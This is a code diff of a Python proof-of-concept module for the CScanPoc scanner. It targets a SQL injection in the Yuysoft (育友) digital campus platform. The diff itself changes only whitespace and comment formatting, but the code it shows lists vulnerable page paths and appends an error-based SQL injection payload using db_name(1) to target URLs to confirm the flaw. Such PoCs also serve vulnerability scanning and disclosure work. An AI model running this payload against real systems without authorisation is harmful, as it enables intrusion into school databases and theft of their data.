@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Yuysoft_0006' # 平台漏洞编号，留空
+    vuln_id = 'Yuysoft_0006'  # 平台漏洞编号，留空
     name = '育友通用数字化校园平台 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-04-03'  # 漏洞公布时间
     desc = '''
         育友通用数字化校园平台 SQL注入漏洞：
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = '育友通用数字化校园平台'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '5d58ffeb-25e9-4ae0-83c4-364a5b6830d1'
     author = '47bwy'  # POC编写者
@@ -34,11 +36,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105458
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105373
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105449
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105701
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0105458
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0105373
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0105449
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0105701
             hh = hackhttp.hackhttp()
             payload1 = [
                 '/IneduPortal/Components/Teacher/ShowTeacher.aspx?famid=1&id=1',
@@ -56,7 +58,8 @@ class Poc(ABPoc):
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
-            payload2 = ['/IneduPortal/Components/WeekCalendar/PrintWeekCalendar.aspx?termid=2014-2015-1']
+            payload2 = [
+                '/IneduPortal/Components/WeekCalendar/PrintWeekCalendar.aspx?termid=2014-2015-1']
             for payload in payload2:
                 get = '%27%20and%20db_name(1)%3E1--'
                 verify_url = self.target + payload + get
@@ -73,6 +76,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
